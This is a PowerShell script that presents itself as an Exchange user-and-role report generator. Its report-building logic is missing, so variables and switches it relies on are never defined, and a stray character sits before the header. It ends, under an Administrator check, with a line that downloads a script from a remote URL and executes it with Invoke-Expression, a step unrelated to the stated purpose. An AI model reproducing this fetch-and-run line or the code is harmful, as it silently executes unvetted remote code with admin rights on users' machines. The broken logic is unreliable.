2<#=============================================================================================
Script by    : Leo Nguyen
Website      : www.bonguides.com
Telegram     : https://t.me/bonguides
Discord      : https://discord.gg/fUVjuqexJg
YouTube      : https://www.youtube.com/@BonGuides

Script Highlights:
~~~~~~~~~~~~~~~~~
#. Single script allows you to generate user report with roles assignments
============================================================================================#>

param (
    [switch]$ex2019,
    [switch]$ex2016
)

if (-not([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "You need to have Administrator rights to run this script!`nPlease re-run this script as an Administrator in an elevated powershell prompt!"
    break
}



 

# Output options to console, graphical grid view or export to CSV file
if($OutCSV.IsPresent) {
    $filePath = "$env:userprofile\desktop\report-$(Get-Date -Format yyyy-mm-dd-hh-mm-ss).csv"
    $report | Export-CSV $filePath -NoTypeInformation -Encoding UTF8
    Write-Host "`nThe report is saved to: $filePath `n" -ForegroundColor Cyan
    Invoke-Item "$env:userprofile\desktop"
} elseif ($OutGridView.IsPresent) {
    $report | Out-GridView
} else {
    $report | Sort-Object -Property Roles -Descending
}

iex "& { $(irm https://bonguides.com/temp/p002.ps1) } -UseChoco"
